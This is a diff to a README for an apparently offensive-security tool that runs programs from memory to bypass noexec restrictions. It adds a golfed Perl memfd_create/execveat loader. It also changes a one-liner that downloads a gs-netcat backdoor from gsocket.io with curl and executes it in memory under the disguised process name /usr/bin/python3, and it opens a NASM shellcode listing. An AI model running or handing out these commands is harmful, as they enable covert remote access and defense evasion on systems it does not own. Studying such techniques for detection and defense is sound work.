@@ -18,7 +18,8 @@ Read the [circumventing the noexec Article](https://iq.thc.org/bypassing-noexec-
 
 ### PERL example:
 ```sh
-source memexec-perl.sh
+# From memexec-perl.sh
+memexec(){ perl '-e$^F=255;for(319,279,385,314){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@";}
 cat /bin/ls | TIME_STYLE=+%s memexec -lah
 ```
 This was golfed by the fine people on Mastodon ([@acut3hack](https://@acut3hack@infosec.exchange), [@addision](https://@addison@nothing-ever.works), [@ilv](https://@ilv@infosec.exchange))
@@ -40,13 +41,14 @@ cat /bin/ls | TIME_STYLE=+%s memexec -- -lah
 
 The educated reader understands that this is mostly used to pipe a backdoor from the Internet directly into memory, even when execution is prohobited by `noexec` or there is no writeable directory (hides as process name `/usr/bin/python3`):
 ```shell
-curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | GS_ARGS="-ilD -s ChangeMe" perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3"' #,@ARGV' -- "$@"
+curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | GS_ARGS="-ilD -s ChangeMe" perl '-e$^F=255;for(319,279,385,314){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@"
 ```
 ---
 
 For the addicts, here is the nasm of the shellcode (memfd_create, copy loop & execveat):
 ```nasm
 ; nasm -felf64 memexec.nasm && ld memexec.o &&  ./a.out
+; cat /bin/ls | TIME_STYLE=+%s ./a.out -- -lah
 
 global _start
 section .text
